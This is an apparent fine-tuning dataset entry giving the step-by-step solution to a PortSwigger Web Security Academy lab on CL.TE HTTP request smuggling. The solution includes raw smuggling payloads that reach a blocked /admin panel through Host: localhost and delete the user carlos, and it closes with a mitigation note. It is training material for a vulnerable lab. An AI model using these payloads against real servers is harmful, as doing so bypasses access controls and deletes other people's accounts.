# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

I'm stuck on the PortSwigger lab "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability" (Practitioner, HTTP request smuggling). Here's the scenario:

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

Note

 Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Please give me the step-by-step solution.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers HTTP request smuggling: "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability".

## Solution steps

1. Try to visit `/admin` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X`
3. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
4. Issue the following request twice: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X`
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=`
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete `carlos`: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=`

## Vulnerability note

Underlying issue: HTTP request smuggling (CWE-444). Use a consistent, well-configured front-end/back-end HTTP stack; reject ambiguous Transfer-Encoding/Content-Length combinations.
